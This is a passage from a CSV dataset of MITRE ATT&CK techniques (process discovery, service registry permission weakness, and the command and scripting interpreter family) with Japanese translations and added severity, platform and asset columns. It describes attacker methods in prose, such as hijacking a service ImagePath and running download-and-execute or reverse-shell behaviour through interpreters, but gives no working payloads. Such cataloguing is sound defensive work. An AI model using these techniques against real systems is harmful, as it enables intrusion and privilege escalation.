Windows環境では、攻撃者は[cmd](https://attack.mitre.org/software/S0106)経由の[Tasklist](https://attack.mitre.org/software/S0057)ユーティリティ、またはPowerShell経由の<code>Get-Process</code>を使用して実行中のプロセスの詳細を取得できます。 [PowerShell](https://attack.mitre.org/techniques/T1059/001)経由で<code>Get-Process</code>を使用することで、実行中のプロセスの詳細情報を取得できます。プロセス情報は、<code>CreateToolhelp32Snapshot</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)呼び出しの出力からも抽出可能です。 MacおよびLinuxでは、<code>ps</code>コマンドで実現されます。攻撃者は`/proc`経由でのプロセス列挙を選択する場合もあります。ESXiも`ps`コマンドに加え、`esxcli system process list`をサポートしています。(引用: Sygnia ESXi Ransomware 2025)(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021) ネットワークデバイスでは、`show processes`などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用して、現在実行中のプロセスを表示できます。(引用: US-CERT-TA18-106A)(引用: show_processes_cisco_cmd),discovery,Linux;Network Devices;Windows;macOS;ESXi,script_command_execution,situational_awareness,privileged_account;endpoint_execution;network_connectivity;cloud_control_plane,specified,Backup Server;Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580,2017-05-31T21:30:48.728Z,2025-04-15T19:58:50.607Z,,,,
T1058,,Service Registry Permissions Weakness,サービスレジストリ権限の脆弱性,"Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security) If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",Windows は、ローカルサービス構成情報をレジストリの <code>HKLM\SYSTEM\CurrentControlSet\Services</code> に保存します。 サービス レジストリ キーに保存されている情報は、サービス コントローラー、sc.exe、[PowerShell](https://attack.mitre.org/techniques/T1086)、または [Reg](https://attack.mitre.org/software/S0075) などのツールを使用して、サービスの実行パラメータを変更するために操作される可能性があります。 レジストリキーへのアクセスは、アクセス制御リスト（ACL）と権限によって制御されます（引用元：MSDN レジストリキーのセキュリティ）。ユーザーやグループの権限が適切に設定されておらず、サービスのレジストリキーへのアクセスを許可している場合、攻撃者はサービスの binPath/ImagePath を変更し、自身の制御下にある別の実行可能ファイルを指すように設定できます。 サービスが開始または再起動されると、攻撃者が制御するプログラムが実行され、攻撃者は永続化と/またはサービスが実行されるアカウントコンテキスト（ローカル/ドメインアカウント、SYSTEM、LocalService、NetworkService）への特権昇格を得ることができます。 攻撃者はまた、サービスが失敗した時や意図的に破損した時に昇格されたコンテキストで実行される可能性のある、サービス失敗パラメータに関連するレジストリキー（例：<code>FailureCommand</code>）を変更する可能性があります。（引用元：TrustedSignal Service Failure）（引用元：Twitter Service Recovery Nov 2017）,persistence;privilege-escalation,Windows,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427,2017-05-31T21:30:49.119Z,2025-04-25T15:15:24.294Z,,,,
T1059,,Command and Scripting Interpreter,コマンドおよびスクリプトインタプリタ,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",攻撃者はコマンドおよびスクリプトインタプリタを悪用し、コマンド、スクリプト、またはバイナリを実行する可能性があります。これらのインターフェースと言語はコンピュータシステムとの対話手段を提供し、多くの異なるプラットフォームに共通する機能です。 ほとんどのシステムには組み込みのコマンドラインインターフェースとスクリプト機能が備わっています。例えば、macOSやLinuxディストリビューションには何らかの[Unixシェル](https://attack.mitre.org/techniques/T1059/004)が含まれ、Windowsインストールには[Windowsコマンドシェル](https://attack.mitre.org/techniques/T1059/003)と [PowerShell](https://attack.mitre.org/techniques/T1059/001)が含まれています。 また、[Python](https://attack.mitre.org/techniques/T1059/006)のようなクロスプラットフォームのインタプリタや、[JavaScript](https://attack.mitre.org/techniques/T1059/007)や [Visual Basic](https://attack.mitre.org/techniques/T1059/005)などがあります。 攻撃者は、任意のコマンドを実行する手段として、これらの技術を様々な方法で悪用する可能性があります。コマンドやスクリプトは、被害者に送られるおとり文書や、既存のC2からダウンロードされる二次ペイロードとして、[初期アクセス](https://attack.mitre.org/tactics/TA0001)ペイロードに埋め込まれることがあります。 攻撃者はまた、対話型端末/シェルを介してコマンドを実行したり、リモート実行を達成するために様々な[リモートサービス](https://attack.mitre.org/techniques/T1021)を利用したりする可能性があります。（引用元：Powershellリモートコマンド）（引用元：Cisco IOSソフトウェア完全性保証 - コマンド履歴）（引用元：Pythonにおけるリモートシェル実行）,execution,IaaS;Identity Provider;Linux;Network Devices;Office Suite;Windows;macOS;ESXi,remote_service_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830,2017-05-31T21:30:49.546Z,2025-04-15T19:58:41.855Z,,,,
T1059.001,T1059,PowerShell,PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363), [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",攻撃者はPowerShellコマンドやスクリプトを悪用して実行を行う可能性があります。PowerShellはWindowsオペレーティングシステムに組み込まれた強力な対話型コマンドラインインターフェイスおよびスクリプト環境です。（出典: TechNet PowerShell）攻撃者はPowerShellを使用して、情報収集やコード実行を含む様々な操作を実行できます。 例としては、実行可能ファイルを起動する<code>Start-Process</code>コマンドレットや、ローカルまたはリモートコンピュータ上でコマンドを実行する<code>Invoke-Command</code>コマンドレットが挙げられます（ただし、PowerShellでリモートシステムに接続するには管理者権限が必要です）。 PowerShellはインターネットから実行可能ファイルをダウンロードして実行する手段としても利用可能であり、ディスクから実行することも、ディスクにアクセスせずにメモリ内で実行することもできます。数多くのPowerShellベースの攻撃的テストツールが利用可能であり、[Empire](https://attack.mitre.org/software/S0363)、[PowerSploit](https://attack.mitre.org/software/S0194)、 [PoshC2](https://attack.mitre.org/software/S0378)、PSAttackなどが挙げられる。（出典: Github PSAttack）PowerShellコマンド/スクリプトは、PowerShellの基盤となる<code>System.Management.Automation</code> アセンブリ DLL へのインターフェースを介して実行することも可能です。(引用: Sixdub PowerPick 2016年1月)(引用: SilentBreak Offensive PS 2015年12月)(引用: Microsoft PSfromCsharp 2014年4月),execution,Windows,script_command_execution,foothold,privileged_account;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736,2020-03-09T13:48:55.078Z,2025-04-15T19:58:52.378Z,,,,
T1059.002,T1059,AppleScript,AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e ""script here""</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript) AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility. Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)","攻撃者はAppleScriptを悪用して実行を行う可能性があります。AppleScriptは、AppleEventsと呼ばれるアプリケーション間メッセージを介してアプリケーションやOSの一部を制御するために設計されたmacOSスクリプト言語です。(引用元: Apple AppleScript) これらのAppleEventメッセージは独立して送信することも、AppleScriptで簡単にスクリプト化することもできます。これらのイベントは、開いているウィンドウの検索、キーストロークの送信、ローカルまたはリモートのほぼすべての開いているアプリケーションとの対話が可能です。 スクリプトはコマンドラインから<code>osascript /path/to/script</code>または<code>osascript -e ""script here""</code>で実行可能。コマンドライン以外にも、メールルール、Calendar.appのアラーム、Automatorワークフローなど多様な方法で実行できる。 AppleScriptは、スクリプトファイルの先頭に<code>#!/usr/bin/osascript</code>を追加することで、プレーンテキストのシェルスクリプトとして実行することもできます。(引用元: SentinelOne AppleScript) AppleScriptは実行に<code>osascript</code>を呼び出す必要はありません。 ただし、macOS [ネイティブAPI](https://attack.mitre.org/techniques/T1106) の<code>NSAppleScript</code>または<code>OSAScript</code>を使用することで、mach-Oバイナリ内部から実行される可能性があります。これらはいずれも、<code>/usr/bin/osascript</code>コマンドラインユーティリティとは独立してコードを実行します。 攻撃者はAppleScriptを悪用し、開いているSSH接続とのやり取り、リモートマシンへの移動、さらにはユーザーに偽のダイアログボックスを表示するといった様々な動作を実行する可能性があります。これらのイベントはアプリケーションをリモートで起動することはできません（ローカルでの起動は可能）が、既にリモートで実行されているアプリケーションとはやり取りが可能です。 macOS 10.10 Yosemite以降では、AppleScriptは[ネイティブAPI](https://attack.mitre.org/techniques/T1106)を実行する機能を有しており、これは通常mach-Oバイナリ形式でのコンパイルと実行を必要とするものです。(引用元: SentinelOne macOS Red Team)スクリプト言語であるため、[Python](https://attack.mitre.org/techniques/T1059/006)経由のリバースシェルなど、より一般的な手法の実行にも利用可能です。(引用元: Macro Malware Targets Macs)",execution,macOS,remote_service_abuse,foothold,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb,2020-03-09T14:07:54.329Z,2025-04-15T19:58:22.484Z,,,,
T1059.003,T1059,Windows Command Shell,Windowsコマンドシェル,"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows) Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems. Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",攻撃者はWindowsコマンドシェルを悪用して実行を行う可能性があります。Windowsコマンドシェル（[cmd](https://attack.mitre.org/software/S0106)）はWindowsシステムにおける主要なコマンドプロンプトです。 Windowsコマンドプロンプトは、コマンドのサブセットごとに必要な権限レベルが異なるものの、システムのほぼあらゆる側面を制御するために使用できます。コマンドプロンプトは、[SSH](https://attack.mitre.org/techniques/T1021/004)などの[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモートで呼び出すことが可能です。(引用: WindowsにおけるSSH) バッチファイル（例: .bat または .cmd）も、シェルに実行する一連のコマンドリストを提供するとともに、条件分岐やループなどの通常のスクリプト操作を可能にします。バッチファイルの一般的な用途には、長時間のタスクや反復的なタスク、あるいは複数のシステムで同じコマンドセットを実行する必要性などが含まれます。 攻撃者は[cmd](https://attack.mitre.org/software/S0106)を利用して様々なコマンドやペイロードを実行する可能性があります。 一般的な使用例としては、単一のコマンドを実行するための [cmd](https://attack.mitre.org/software/S0106) や、コマンド＆コントロールチャネルを介して入出力を転送する対話型の [cmd](https://attack.mitre.org/software/S0106) の悪用などがあります。,execution,Windows,remote_service_abuse,foothold,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62,2020-03-09T14:12:31.196Z,2025-04-15T19:59:10.209Z,,,,
T1059.004,T1059,Unix Shell,Unix シェル,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges. Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems. Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence. Some systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.",攻撃者は、Unix シェルコマンドやスクリプトを悪用して実行を行う可能性があります。Unix シェルは、Linux、macOS、ESXi システムにおける主要なコマンドプロンプトですが、特定の OS やディストリビューションに応じて、Unix シェルのバリエーション（sh、ash、bash、zsh など）が多数存在します。(引用: DieNet Bash)(引用: Apple ZShell)Unixシェルはシステムのあらゆる側面を制御でき、特定のコマンドには昇格された権限が必要となる。Unixシェルはまた、コマンドの順次実行や条件分岐・ループなどの典型的なプログラミング操作を可能にするスクリプトをサポートする。シェルスクリプトの一般的な用途には、長時間のタスクや反復的なタスク、あるいは複数のシステムで同じコマンドセットを実行する必要性などが含まれる。 攻撃者はUnixシェルを悪用し、様々なコマンドやペイロードを実行する可能性があります。対話型シェルは、コマンド＆コントロールチャネル経由、あるいは[SSH](https://attack.mitre.org/techniques/T1021/004)を用いた横方向移動中にアクセスされる場合があります。 攻撃者はまた、被害者に対して複数のコマンドを配信・実行するため、あるいは持続性確保用のペイロードの一部としてシェルスクリプトを活用する可能性があります。組み込みデバイス、軽量Linuxディストリビューション、ESXiサーバーなどの一部のシステムでは、Busybox（シンプルなシェルを含む多様なツールを内蔵した小型実行ファイル）を介して、機能限定版のUnixシェルが利用される場合があります。,execution,Linux;Network Devices;macOS;ESXi,remote_service_abuse,foothold,privileged_account;endpoint_execution;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56,2020-03-09T14:15:05.330Z,2025-04-15T19:58:56.647Z,,,,
T1059.005,T1059,Visual Basic,Visual Basic,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft) Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript) Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",攻撃者はVisual Basic（VB）を悪用して実行を行う可能性がある。VBはMicrosoftが開発したプログラミング言語であり、Windows APIを介して[Component Object Model](https://attack.mitre.org/techniques/T1559/001)や[Native API](https://attack.mitre.org/techniques/T1106)など多くのWindows技術との相互運用性を有する。 将来的な進化は予定されていないレガシー言語として分類されているものの、VBは.NET Frameworkおよびクロスプラットフォームの.NET Coreに統合・サポートされている。(引用: VB .NET 2020年3月)(引用: VB Microsoft) VBを基盤とした派生言語として、Visual Basic for Applications (VBA) やVBScriptも開発されている。 VBA は、Microsoft Office およびいくつかのサードパーティ製アプリケーションに組み込まれた、イベント駆動型プログラミング言語です。(引用: Microsoft VBA)(引用: Wikipedia VBA) VBA により、ドキュメントにマクロを含めることができ、ホスト上でのタスクの実行やその他の機能を自動化することができます。 VBScriptはWindowsホストのデフォルトスクリプト言語であり、Internet Explorer向けに提供されるHTMLアプリケーション(HTA)ウェブページでは[JavaScript](https://attack.mitre.org/techniques/T1059/007)の代わりに使用することも可能です（ただし、最新のブラウザのほとんどはVBScriptをサポートしていません）。(引用元: Microsoft VBScript) 攻撃者はVBペイロードを使用して悪意のあるコマンドを実行する可能性があります。一般的な悪用例には、VBScriptによる動作の自動実行や、VBAコンテンツを[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001) ペイロードへの埋め込み（実行を可能にするために[Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005)を伴う場合もある）。(引用元: Default VBS macros Blocking ),execution,Windows;macOS;Linux,script_command_execution,foothold,user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67,2020-03-09T14:29:51.508Z,2025-04-15T19:59:14.314Z,,,,
T1059.006,T1059,Python,Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020) Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",攻撃者はPythonコマンドやスクリプトを悪用して実行を行う可能性がある。Pythonは非常に普及したスクリプト/プログラミング言語であり、多様な機能を実現できる。Pythonはコマンドラインから対話的に実行可能（<code>python.exe</code>インタプリタ経由）であり、スクリプト（.py）として記述・配布して異なるシステムで実行することもできる。 Pythonコードはバイナリ実行ファイルにコンパイルすることも可能です。（引用元：Zscaler APT31 Covid-19 October 2020）Pythonには、ファイル操作やデバイスI/Oなど基盤システムとやり取りするための多くの組み込みパッケージが付属しています。攻撃者はこれらのライブラリを利用して、コマンドや他のスクリプトをダウンロード・実行したり、様々な悪意のある動作を実行したりできます。,execution,Linux;Windows;macOS;ESXi,script_command_execution,foothold,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1,2020-03-09T14:38:24.334Z,2025-04-15T19:59:08.245Z,,,,
T1059.007,T1059,JavaScript,JavaScript,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS) JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts) JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode) Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",攻撃者は、実行のために様々な実装のJavaScriptを悪用する可能性があります。JavaScript（JS）は、プラットフォームに依存しないスクリプト言語（実行時にジャストインタイムでコンパイルされる）であり、一般的にウェブページのスクリプトに関連付けられますが、JSはブラウザ外の実行環境でも実行可能です。（引用元：NodeJS）JScriptは、同じスクリプト標準のMicrosoftによる実装です。 JScript は Windows スクリプトエンジンによって解釈されるため、[Component Object Model](https://attack.mitre.org/techniques/T1559/001) や Internet Explorer HTML Application (HTA) ページなど、Windows の多くのコンポーネントと統合されています。(引用: JScrip 2018年5月)(引用: Microsoft JScript 2007)(引用: Microsoft Windows Scripts)JavaScript for Automation (JXA) は、AppleのOpen Scripting Architecture (OSA) の一部としてOSX 10.10で導入された、JavaScriptベースのmacOSスクリプト言語である。 AppleのOSAは、アプリケーション制御、OSとの連携、Apple内部APIへのブリッジアクセスを実現するスクリプト機能を提供します。OSX 10.10時点では、OSAがサポートする言語はJXAと[AppleScript](https://attack.mitre.org/techniques/T1059/002)の2つです。 スクリプトはコマンドラインユーティリティ<code>osascript</code>で実行可能であり、<code>osacompile</code>でアプリケーションやスクリプトファイルにコンパイルできるほか、OSAKitフレームワークを活用することで他のプログラムのメモリ内でコンパイル・実行される。(引用: Apple About Mac Scripting 2016)(引用: SpecterOps JXA 2020)(引用: SentinelOne macOS Red Team)(引用: Red Canary Silver Sparrow 2021年2月)(引用: MDSec macOS JXA and VSCode) 攻撃者は様々なJavaScript実装を悪用し、多様な動作を実行する可能性があります。一般的な手法には、[ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189)の一環としてウェブサイトに悪意のあるスクリプトをホストすることや、二次ペイロードとしてこれらのスクリプトファイルをダウンロード・実行することが含まれます。 これらのペイロードはテキストベースであるため、攻撃者が[難読化されたファイルや情報](https://attack.mitre.org/techniques/T1027)の一環として内容を難読化することも非常に一般的です。,execution,Windows;macOS;Linux,script_command_execution,foothold,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d,2020-06-23T19:12:24.924Z,2025-04-15T22:43:16.394Z,,,,
T1059.008,T1059,Network Device CLI,ネットワークデバイスのCLI,"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)",攻撃者は、ネットワークデバイス上のスクリプティング機能や組み込みのコマンドラインインタプリタ（CLI）を悪用し、悪意のあるコマンドやペイロードを実行する可能性があります。CLIは、ユーザーや管理者がシステム情報の閲覧、デバイス操作の変更、診断や管理機能の実行を行うためにデバイスと対話する主要な手段です。CLIには通常、異なるコマンドに必要な様々な権限レベルが含まれています。スクリプティングインタプリタはタスクを自動化し、ネットワークOSに組み込まれたコマンドセットを超える機能を拡張します。 CLIおよびスクリプトインタプリタには、直接コンソール接続、またはtelnetや[SSH](https://attack.mitre.org/techniques/T1021/004)などのリモート手段を通じてアクセスできます。 攻撃者はネットワークCLIを利用して、ネットワークデバイスの動作や運用を変更できます。CLIは、トラフィックフローを操作してデータを傍受または改ざんしたり、起動時設定パラメータを変更して悪意のあるシステムソフトウェアをロードしたり、検出回避のためにセキュリティ機能やロギングを無効化したりするために使用される可能性があります。（引用元：Cisco Synful Knock Evolution）,execution,Network Devices,remote_service_abuse,foothold,privileged_account;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--818302b2-d640-477b-bf88-873120ce85c4,2020-10-20T00:09:33.072Z,2025-04-16T20:37:18.015Z,,,,
T1059.009,T1059,Cloud API,クラウドAPI,"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006). Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies. With proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that 